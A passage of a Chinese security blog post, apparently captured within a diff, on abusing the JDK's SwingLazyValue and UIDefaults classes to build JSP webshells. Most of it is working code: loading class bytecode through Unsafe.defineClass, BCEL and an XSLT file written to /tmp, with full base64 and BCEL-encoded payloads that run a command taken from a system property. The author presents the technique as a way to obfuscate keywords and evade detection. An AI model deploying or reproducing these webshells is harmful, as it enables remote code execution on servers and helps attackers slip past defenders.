ABcAGAAAAAAAAgABABkAGgABABsAAAAvAAEAAQAAAAUqtwABsQAAAAIAHAAAAAYAAQAAAAUAHQAAAAwAAQAAAAUAHgAfAAAACAAgABoAAQAbAAAA+gAHAAQAAABWEgK4AANLuwAEWbcABUy7AAZZuwAHWbgACCoSCbYACrYAC7YADLcADbcADk0stgAPWU7GABErLbYAEBIRtgAQV6f/7KcACE4ttgATEhQrtgAVuAAWV7EAAQAOAEMARgASAAMAHAAAACoACgAAAAgABgAJAA4ADAAsAA8ANQAQAEMAFABGABIARwATAEsAFQBVABYAHQAAADQABQAyABEAIQAiAAMALAAaACMAJAACAEcABAAlACYAAwAGAE8AJwAiAAAADgBHACgAKQABACoAAAAgAAT+ACwHACsHACwHAC0W/wACAAIHACsHACwAAQcALgQAAQAvAAAAAgAw&#34;);
+</span></span><span class="line"><span class="cl">    System.setProperty(&#34;cmd&#34;, &#34;open /&#34;);
+</span></span><span class="line"><span class="cl">    Method invoke = MethodUtil.class.getMethod(&#34;invoke&#34;, Method.class, Object.class, Object[].class);
+</span></span><span class="line"><span class="cl">    Method defineClass = Unsafe.class.getDeclaredMethod(&#34;defineClass&#34;, String.class, byte[].class, int.class, int.class, ClassLoader.class, ProtectionDomain.class);
+</span></span><span class="line"><span class="cl">    Field f = Unsafe.class.getDeclaredField(&#34;theUnsafe&#34;);
+</span></span><span class="line"><span class="cl">    f.setAccessible(true);
+</span></span><span class="line"><span class="cl">    Object unsafe = f.get(null);
+</span></span><span class="line"><span class="cl">    Object[] ags = new Object[]{invoke, new Object(), new Object[]{defineClass, unsafe, new Object[]{&#34;exp&#34;, bcode, 0, bcode.length, null, null}}};
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    SwingLazyValue swingLazyValue = new SwingLazyValue(&#34;sun.reflect.misc.MethodUtil&#34;, &#34;invoke&#34;, ags);
+</span></span><span class="line"><span class="cl">    SwingLazyValue swingLazyValue1 = new SwingLazyValue(&#34;exp&#34;, null, new Object[0]);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Object[] keyValueList = new Object[]{&#34;aaa&#34;, swingLazyValue};
+</span></span><span class="line"><span class="cl">    Object[] keyValueList1 = new Object[]{&#34;bbb&#34;, swingLazyValue1};
+</span></span><span class="line"><span class="cl">    UIDefaults uiDefaults1 = new UIDefaults(keyValueList);
+</span></span><span class="line"><span class="cl">    UIDefaults uiDefaults2 = new UIDefaults(keyValueList1);
+</span></span><span class="line"><span class="cl">    uiDefaults1.get(&#34;aaa&#34;);
+</span></span><span class="line"><span class="cl">    uiDefaults2.get(&#34;bbb&#34;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="利用四bcel加载字节码" class="headerLink">
+    <a href="#%e5%88%a9%e7%94%a8%e5%9b%9bbcel%e5%8a%a0%e8%bd%bd%e5%ad%97%e8%8a%82%e7%a0%81" class="header-mark"></a>3.4 利用四：BCEL加载字节码</h3><p>JDK中还有一个神奇的类：com.sun.org.apache.bcel.internal.util.JavaWrapper，可以通过BCEL加载字节码。</p>
+<p>这个类比较小众，在之前的CTF中也被人挖掘了出来。BCEL虽然不需要出网但是会有版本限制。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">javax.swing.UIDefaults#get
+</span></span><span class="line"><span class="cl">	sun.swing.SwingLazyValue#createValue
+</span></span><span class="line"><span class="cl">  	com.sun.org.apache.bcel.internal.util.JavaWrapper#_main
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;javax.swing.*&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;sun.swing.SwingLazyValue&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    String payload = &#34;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dU$dbR$TY$U$5d$H$9a$9c$d0i$40$C$u$a83$e3$8c$b7$80$c1$ccx$X$itp$f0$82$B$U$Q$8c$f7N$e7$Q$h$93N$aa$d3$a1$f4$8b$7c$f6$rPC$d5$3c$ce$83$9f$e2G$e8$ac$d3$J$81$94m$95$3c$ec$e6$ac$bd$f7$da$d7s$f2$e9$cb$3f$ff$C$b8$84M$T$a3$b8$g$c7$84$89k$b8$$1e$c2$c0U$89i$89$h$s$fe$c4L$i7M$dc$c2_$fa0k$e26$fe6$n1g$o$86$3bZ$dc$d5$O$f7$e2$b8$_1o$o$89$Hqd5$b4$a0$J$X$r$96$q$k$K$c4n$b8$9e$h$cc$It$a7$c6$d7$E$8c$db$95$82$S$Y$c8$ba$9eZ$ac$97$f3$ca_$b5$f3$r$o$c9l$c5$b1Kk$b6$ef$eas$L4$827n$8d$i$d9$b9$z$b74$z$d0$f3$aal$bb$9e$c0$e1$d4$b3$ec$a6$bdegJ$b6W$cc$ac$E$be$eb$V$a7C$fa$Sy5$d97Z$81$fe$7c$7dcC$f9$aa$b0$ac$ec$82$f2$FF$9bVn$r3$db$a1$a1$ad$m$c9H$5b$7d$7fi$ee$9d$a3$aa$81$5b$f1$a83l$bf$b8$r0$U$91$C$abt$ca$F$81$beZx$9e$ad$bb$a50$d2$d87$a6$z$V$3d$faV$C$dby$bb$60W$c3$9a$r$kq$U$e1$U$c6$d9W$B$b3$j$ba$s$b1$cc$f3J$a5$ee$3b$ea$8e$ab$fb$d3$ab$fbr$5es$5b$Y$c3Q$89$V$L$abx$yp$e4$3b$f1$d8$ba$e8$9a$99c$bbZ$afZ$P$e8$a5$ecrS$t$b1fa$jO$d8$96$T$cc$cfB$OO$z$3c$c3s$89$X$W$5e$e2$95$O$feZ$L$a6$91$87c$a1$A$s$tL6$v$a2$85$W6p$94$9d$f2U$60$a1$a8$cd$df$c0e$5bu$z$C$87$f63_$cao$w$t$e8$80$9a$c5$ec$f1$86P$9b$b7$d3$f0$7d$zPe$81DQ$F$P$fdJU$f9$c1$7b$813$a9$88$b5$89$g$e3$e0$3e$b6$5c$f7$C$b7$cczLR$b5$P$p$a9$83$7e$zXoh$adZr$99$f3$d9$a8H$91$hc$a8w$ca$RHE$ae$f4$B$88U8$aaV$ebL$ae$Fr$b9$99$dc$81$c1q$D$f6$S$ec$9c$u$ddGS$91$K$7d$7d$86$f6U$ad$ab$a0$d18$f5$85lx$b1$86S$91$ed$8a$d9$d5$aa$f2$b8$f8$93$3f$d4$e0$fd$e5$l$a8$f2$i$847$60$d5$b7$jF$88$H$95$bd$n$tj$Hgw$z$82$fa$87$a6$89_q$84O$9d$fe$eb$82$d0$f7$84$f2$YO$Z$7e$F$bf$3d$T$db$Q$lC$f5q$caX$T$c4O$94V$eb$ff$9f$f1$L$bf$bd8A$b2$$$ed$y$S$7c$L$7b$88$3dMv$ed$a0$3b$bb$L$p$b7$8d$9e$85$5d$c4r$bb$90$b9$j$c4$cf$r$7b$h0$hH4$60m$a3o$h$fd$8b$93$N$M$e4$a6$8c$ff$90L$8f$Z$N$iJ$OR$ac$7f$f8$fa$f9$D$cc$vCCC$c9$e1t$D$p$3b8$bc$fe$91$b1$fb1$87$7b$7c$5b$bb$c3$cc$s$60RJf$Y$a7$s$814$e5$V$M$d0f$88V$83$98$a7$e5$S$86y$3fG$c2$ecghy$91$d8o8$c9w9M$8eS8M$aeyf$7e$Gg$891$7f$a40$kV$bdJ$fe$93a$cc$y$ce$d1$ba$L$93$c4$e9$f9$Fi$89$f3$S$Z$89$dfG$bf$S$ef$96$f8$a3$89$40H$5c$d0A$402$c1_$V$81$cba$p$af$fc$P$f9$bc$c9$b6h$G$A$A&#34;;
+</span></span><span class="line"><span class="cl">    System.setProperty(&#34;cmd&#34;, &#34;open /&#34;);
+</span></span><span class="line"><span class="cl">    SwingLazyValue swingLazyValue = new SwingLazyValue(&#34;com.sun.org.apache.bcel.internal.util.JavaWrapper&#34;, &#34;_main&#34;, new Object[]{new String[]{payload}});
+</span></span><span class="line"><span class="cl">    UIDefaults u1 = new UIDefaults();
+</span></span><span class="line"><span class="cl">    u1.put(&#34;aaa&#34;, swingLazyValue);
+</span></span><span class="line"><span class="cl">    u1.get(&#34;aaa&#34;);
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="利用五落盘xslt并加载" class="headerLink">
+    <a href="#%e5%88%a9%e7%94%a8%e4%ba%94%e8%90%bd%e7%9b%98xslt%e5%b9%b6%e5%8a%a0%e8%bd%bd" class="header-mark"></a>3.5 利用五：落盘XSLT并加载</h3><p>由于内置了一些黑名单过滤，NacOS打内存马主要是通过这种方式绕过。首先通过com.sun.org.apache.xml.internal.security.utils.JavaUtils#writeBytesToFilename写入文件，然后通过com.sun.org.apache.xalan.internal.xslt.Process#_main去加载XSLT文件触发transform，达到任意字节码加载的目的。不需要出网，应该没有JDK版本限制，但是要写一个文件，同样需要触发两次。</p>
+<p>这个类也捂了很久，但是还是被挖到并公开了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">&lt;%@ page import=&#34;java.util.Random&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;java.util.HashMap&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;sun.swing.SwingLazyValue&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;javassist.ClassPool&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;javassist.ClassClassPath&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page import=&#34;javax.swing.*&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">    String xsltTemplate = &#34;&lt;xsl:stylesheet version=\&#34;1.0\&#34; xmlns:xsl=\&#34;http://www.w3.org/1999/XSL/Transform\&#34;\n&#34; +
+</span></span><span class="line"><span class="cl">            &#34;xmlns:b64=\&#34;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder\&#34;\n&#34; +
+</span></span><span class="line"><span class="cl">            &#34;xmlns:ob=\&#34;http://xml.apache.org/xalan/java/java.lang.Object\&#34;\n&#34; +
+</span></span><span class="line"><span class="cl">            &#34;xmlns:th=\&#34;http://xml.apache.org/xalan/java/java.lang.Thread\&#34;\n&#34; +
+</span></span><span class="line"><span class="cl">            &#34;xmlns:ru=\&#34;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils\&#34;\n&#34; +
+</span></span><span class="line"><span class="cl">            &#34;&gt;\n&#34; +
+</span></span><span class="line"><span class="cl">            &#34;    &lt;xsl:template match=\&#34;/\&#34;&gt;\n&#34; +
+</span></span><span class="line"><span class="cl">            &#34;      &lt;xsl:variable name=\&#34;bs\&#34; select=\&#34;b64:decodeBuffer(b64:new(),&#39;&lt;base64_payload&gt;&#39;)\&#34;/&gt;\n&#34; +
+</span></span><span class="line"><span class="cl">            &#34;      &lt;xsl:variable name=\&#34;cl\&#34; select=\&#34;th:getContextClassLoader(th:currentThread())\&#34;/&gt;\n&#34; +
+</span></span><span class="line"><span class="cl">            &#34;      &lt;xsl:variable name=\&#34;rce\&#34; select=\&#34;ru:defineClass(&#39;&lt;class_name&gt;&#39;,$bs,$cl)\&#34;/&gt;\n&#34; +
+</span></span><span class="line"><span class="cl">            &#34;      &lt;xsl:value-of select=\&#34;$rce\&#34;/&gt;\n&#34; +
+</span></span><span class="line"><span class="cl">            &#34;    &lt;/xsl:template&gt;\n&#34; +
+</span></span><span class="line"><span class="cl">            &#34;  &lt;/xsl:stylesheet&gt;&#34;;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    String base64Code = &#34;yv66vgAAADQAYwoAGAAxCAAnCgAyADMHADQKAAQAMQcANQcANgoANwA4CAA5CgA6ADsKADcAPAoAPQA+CgAHAD8KAAYAQAoABgBBCgAEAEIIAEMHAEQKABIARQgARgoABABHCgAyAEgHAEkHAEoBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABUxleHA7AQAIPGNsaW5pdD4BAARsaW5lAQASTGphdmEvbGFuZy9TdHJpbmc7AQAOYnVmZmVyZWRSZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAA1TdGFja01hcFRhYmxlBwBLBwA0BwA1BwBEAQAKU291cmNlRmlsZQEACGV4cC5qYXZhDAAZABoHAEwMAE0ATgEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIHAE8MAFAAUQEAASAHAEsMAFIAUwwAVABVBwBWDABXAFgMABkAWQwAGQBaDABbAFwMAF0AXgEAAQoBABNqYXZhL2lvL0lPRXhjZXB0aW9uDABfABoBAANyZXQMAGAAXAwAYQBiAQADZXhwAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABXNwbGl0AQAnKExqYXZhL2xhbmcvU3RyaW5nOylbTGphdmEvbGFuZy9TdHJpbmc7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAD3ByaW50U3RhY2tUcmFjZQEACHRvU3RyaW5nAQALc2V0UHJvcGVydHkBADgoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwAhABcAGAAAAAAAAgABABkAGgABABsAAAAvAAEAAQAAAAUqtwABsQAAAAIAHAAAAAYAAQAAAAsAHQAAAAwAAQAAAAUAHgAfAAAACAAgABoAAQAbAAAA+gAHAAQAAABWEgK4AANLuwAEWbcABUy7AAZZuwAHWbgACCoSCbYACrYAC7YADLcADbcADk0stgAPWU7GABErLbYAEBIRtgAQV6f/7KcACE4ttgATEhQrtgAVuAAWV7EAAQAOAEMARgASAAMAHAAAACoACgAAAA4ABgAPAA4AEgAsABUANQAWAEMAGgBGABgARwAZAEsAGwBVABwAHQAAADQABQAyABEAIQAiAAMALAAaACMAJAACAEcABAAlACYAAwAGAE8AJwAiAAAADgBHACgAKQABACoAAAAgAAT+ACwHACsHACwHAC0W/wACAAIHACsHACwAAQcALgQAAQAvAAAAAgAw&#34;;
+</span></span><span class="line"><span class="cl">    String xslt = xsltTemplate.replace(&#34;&lt;base64_payload&gt;&#34;, base64Code).replace(&#34;&lt;class_name&gt;&#34;, &#34;exp&#34;);
+</span></span><span class="line"><span class="cl">    System.setProperty(&#34;cmd&#34;, &#34;open /&#34;);
+</span></span><span class="line"><span class="cl">    SwingLazyValue value1 = new SwingLazyValue(&#34;com.sun.org.apache.xml.internal.security.utils.JavaUtils&#34;, &#34;writeBytesToFilename&#34;, new Object[]{&#34;/tmp/nacos_data_temp&#34;, xslt.getBytes()});
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    SwingLazyValue value2 = new SwingLazyValue(&#34;com.sun.org.apache.xalan.internal.xslt.Process&#34;, &#34;_main&#34;, new Object[]{new String[]{&#34;-XT&#34;, &#34;-XSL&#34;, &#34;file:///tmp/nacos_data_temp&#34;}});
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    UIDefaults uiDefaults = new UIDefaults();
+</span></span><span class="line"><span class="cl">    UIDefaults uiDefaults2 = new UIDefaults();
+</span></span><span class="line"><span class="cl">    uiDefaults.put(&#34;aaa&#34;, value1);
+</span></span><span class="line"><span class="cl">    uiDefaults2.put(&#34;bbb&#34;, value2);
+</span></span><span class="line"><span class="cl">    uiDefaults.get(&#34;aaa&#34;);
+</span></span><span class="line"><span class="cl">    uiDefaults2.get(&#34;bbb&#34;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="优化" class="headerLink">
+    <a href="#%e4%bc%98%e5%8c%96" class="header-mark"></a>4 优化</h2><p>sun.swing.SwingLazyValue#createValue 因为ClassLoader的原因 ，在SwingLazyValue这里只能加载rt.jar 里面的类，而一些gadgets如jdk.nashorn.internal.codegen.DumpBytecode.dumpBytecode就位于nashorn.jar 里面</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477118542-acfc7a5f-a5b1-4c1a-b97f-f34073d265b1.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477118542-acfc7a5f-a5b1-4c1a-b97f-f34073d265b1.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477118542-acfc7a5f-a5b1-4c1a-b97f-f34073d265b1.png"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477118542-acfc7a5f-a5b1-4c1a-b97f-f34073d265b1.png, https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477118542-acfc7a5f-a5b1-4c1a-b97f-f34073d265b1.png 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477118542-acfc7a5f-a5b1-4c1a-b97f-f34073d265b1.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>然后有师傅发现了另一个类：javax.swing.UIDefaults.ProxyLazyValue#createValue，这个类中的createValue的实现可以获取线程上下文中的类，应该来说兼容性更强。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477120022-aedb6be5-6efd-4eef-b668-cc65621e60f4.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477120022-aedb6be5-6efd-4eef-b668-cc65621e60f4.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477120022-aedb6be5-6efd-4eef-b668-cc65621e60f4.png"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477120022-aedb6be5-6efd-4eef-b668-cc65621e60f4.png, https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477120022-aedb6be5-6efd-4eef-b668-cc65621e60f4.png 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1689477120022-aedb6be5-6efd-4eef-b668-cc65621e60f4.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h2 id="最后" class="headerLink">
+    <a href="#%e6%9c%80%e5%90%8e" class="header-mark"></a>5 最后</h2><p>当然还有一些跟其他gadgets结合的利用方式，本文主要挑选了一些较为通用的、可用于WebShell场景的例子。</p>
+<p>有些demo看起来有点多次一举，但实际上这个类的最大用处在于可以把一些敏感的关键字放到一个字符串的位置，这样我们就可以对字符串进行变形混淆，从而隐藏掉之前难以避免的特征。</p>
+<h2 id="参考" class="headerLink">
+    <a href="#%e5%8f%82%e8%80%83" class="header-mark"></a>6 参考</h2><p><a href="https://flowerwind.github.io/2023/04/17/%e8%ae%b0%e6%9f%90%e6%ac%a1%e5%ae%9e%e6%88%98hessian%e4%b8%8d%e5%87%ba%e7%bd%91%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%88%a9%e7%94%a8-md/" target="_blank" rel="noopener noreferrer">https://flowerwind.github.io/2023/04/17/%E8%AE%B0%E6%9F%90%E6%AC%A1%E5%AE%9E%E6%88%98hessian%E4%B8%8D%E5%87%BA%E7%BD%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8-md/</a></p>
+<p><a href="https://blog.wanghw.cn/security/hessian-deserialization-jdk-rce-gadget.html" target="_blank" rel="noopener noreferrer">https://blog.wanghw.cn/security/hessian-deserialization-jdk-rce-gadget.html</a></p>
+<p><a href="https://exp10it.cn/2023/06/nacos-jraft-hessian-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96-rce-%e5%88%86%e6%9e%90/#javautilswritebytestofilename--systemload" target="_blank" rel="noopener noreferrer">https://exp10it.cn/2023/06/nacos-jraft-hessian-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-rce-%E5%88%86%E6%9E%90/#javautilswritebytestofilename&ndash;systemload</a></p>
+<p><a href="https://y4er.com/posts/nacos-hessian-rce/" target="_blank" rel="noopener noreferrer">https://y4er.com/posts/nacos-hessian-rce/</a></p>
+<p><a href="http://www.bmth666.cn/bmth_blog/2023/02/07/0CTF-TCTF-2022-hessian-onlyJdk/" target="_blank" rel="noopener noreferrer">http://www.bmth666.cn/bmth_blog/2023/02/07/0CTF-TCTF-2022-hessian-onlyJdk/</a></p>
+</div>
+
+        
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2023-07-16</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/swinglazyvalue-in-webshell/" data-title="SwingLazyValue在WebShell下的利用"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/swinglazyvalue-in-webshell/"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/swinglazyvalue-in-webshell/" data-title="SwingLazyValue在WebShell下的利用"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/swinglazyvalue-in-webshell/" data-title="SwingLazyValue在WebShell下的利用"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/swinglazyvalue-in-webshell/" data-title="SwingLazyValue在WebShell下的利用"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/swinglazyvalue-in-webshell/" data-title="SwingLazyValue在WebShell下的利用" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;SwingLazyValue在WebShell下的利用&#34;, &#34;https://yzddmr6.com/posts/swinglazyvalue-in-webshell/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/sharpalternativeshellcodeexec/" class="prev" rel="prev" title="从ChatGPT到SharpAlternativeShellcodeExec"><i class="fas fa-angle-left fa-fw"></i>从ChatGPT到SharpAlternativeShellcodeExec</a>
+            <a href="/posts/gzh/" class="next" rel="next" title="[置顶] 搞了个公众号">[置顶] 搞了个公众号<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
